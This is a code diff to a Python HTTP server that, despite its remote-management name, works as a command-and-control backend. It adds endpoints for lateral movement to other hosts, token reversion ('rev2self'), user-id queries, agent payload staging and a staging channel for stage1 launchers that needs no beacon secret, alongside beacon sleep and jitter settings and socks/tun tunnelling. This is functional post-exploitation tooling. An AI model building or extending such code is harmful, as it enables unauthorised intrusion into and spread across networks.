+            elif status in ("agent_type_unsupported", "session_busy"):
+                self._json(409, {"error": status})
+            elif status == "session_killed":
+                self._json(410, {"error": status})
+            elif status == "server_stopped":
+                self._json(503, {"error": status})
+            elif status == "timeout":
+                self._json(408, {"error": status, "command": REV2SELF_COMMAND})
+            else:
+                self._json(200, result)
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "lateral":
+            session = _resolve_api_session(self, parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            try:
+                verify = body.get("verify", True)
+                exec_timeout = float(body.get("exec_timeout", 300))
+                register_timeout = float(body.get("register_timeout", 60))
+                verify_timeout = float(body.get("verify_timeout", 120))
+                if not isinstance(verify, bool):
+                    raise ValueError("verify must be a boolean")
+                if not all(1 <= value <= 3600
+                           for value in (exec_timeout, register_timeout, verify_timeout)):
+                    raise ValueError("lateral timeouts must be between 1 and 3600 seconds")
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_lateral_options"})
+                return True
+            result, status = srv.lateral_move(
+                session.id,
+                str(body.get("method") or ""),
+                str(body.get("host") or ""),
+                verify=verify,
+                exec_timeout=exec_timeout,
+                register_timeout=register_timeout,
+                verify_timeout=verify_timeout,
+            )
+            if status == "not_found":
+                self._json(404, {"error": "session_not_found"})
+            elif status in ("agent_type_unsupported", "session_busy"):
+                self._json(409, {"error": status})
+            elif status in ("invalid_method", "invalid_host"):
+                self._json(400, {"error": status})
+            elif status == "agent_payload_unavailable":
+                self._json(503, {"error": status,
+                                 "detail": "No Windows agent build is staged on the server; run build_go_agent first."})
+            elif status == "session_killed":
+                self._json(410, {"error": status})
+            elif status == "server_stopped":
+                self._json(503, {"error": status})
+            elif status == "timeout":
+                self._json(408, {"error": status, "command": LATERAL_COMMAND})
+            else:
+                self._json(200, result)
+            return True
+
+        if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "uid":
+            session = _resolve_api_session(self, parts[1])
+            if not session:
+                self._json(404, {"error": "session_not_found"})
+                return True
+            try:
+                timeout = float(body.get("timeout", 120))
+                if not 1 <= timeout <= 3600:
+                    raise ValueError("timeout must be between 1 and 3600 seconds")
+            except (TypeError, ValueError):
+                self._json(400, {"error": "invalid_uid_options"})
+                return True
+            result, status = srv.session_uid(session.id, timeout=timeout)
+            if status == "not_found":
+                self._json(404, {"error": "session_not_found"})
+            elif status in ("agent_type_unsupported", "session_busy"):
+                self._json(409, {"error": status})
+            elif status == "session_killed":
+                self._json(410, {"error": status})
+            elif status == "server_stopped":
+                self._json(503, {"error": status})
+            elif status == "timeout":
+                self._json(408, {"error": status, "command": UID_COMMAND})
+            else:
+                self._json(200, result)
             return True
 
         if len(parts) == 3 and parts[0] == "sessions" and parts[2] == "upload":
@@ -5004,6 +5669,17 @@ class RMMHandler(BaseHTTPRequestHandler):
             if self._serve_plugin_tool(plugin_name, session_id):
                 return
 
+        if path.startswith("/tools/stage/"):
+            # Capability-authenticated staging channel: the unguessable
+            # staging identifier in the path is the only credential, so the
+            # compact stage1 launcher needs no beacon secret.
+            staging_id = path[len("/tools/stage/"):].strip("/")
+            if not STAGING_ID_RE.match(staging_id):
+                self._respond(400, "Invalid staging id")
+                return
+            if self._serve_stage_tool(staging_id):
+                return
+
         if self._serve_web(path):
             return
         
@@ -5039,17 +5715,22 @@ class RMMHandler(BaseHTTPRequestHandler):
                     jitter_percent = int(qs["j"][0])
             except (TypeError, ValueError):
                 pass
-            reg = self.server_instance.register_session(
-                session_id,
-                hostname,
-                username,
-                ip,
-                sleep_seconds=sleep_seconds,
-                jitter_percent=jitter_percent,
-                sync_client_config=sync_client,
-                agent_type=agent_type,
-                capabilities=capabilities,
-            )
+            try:
+                reg = self.server_instance.register_session(
+                    session_id,
+                    hostname,
+                    username,
+                    ip,
+                    sleep_seconds=sleep_seconds,
+                    jitter_percent=jitter_percent,
+                    sync_client_config=sync_client,
+                    agent_type=agent_type,
+                    capabilities=capabilities,
+                    workspace_id=qs.get("workspace_id", [""])[0],
+                )
+            except ValueError:
+                self._respond(403, "AGENT WORKSPACE REJECTED")
+                return
             if reg is None:
                 self._respond(403, "TERMINATED")
             else:
@@ -5138,6 +5819,15 @@ class RMMHandler(BaseHTTPRequestHandler):
                 return
             self._respond(404, "Not Found")
             return
+
+        if path.startswith("/tools/stage/"):
+            # Capability-authenticated stage1 status reporting; no beacon secret.
+            staging_id = path[len("/tools/stage/"):].strip("/")
+            if not STAGING_ID_RE.match(staging_id):
+                self._respond(400, "Invalid staging id")
+                return
+            if self._serve_stage_tool(staging_id):
+                return
 
         if path in ("/result", "/socks", "/tun"):
             if not self._beacon_authorized(qs):
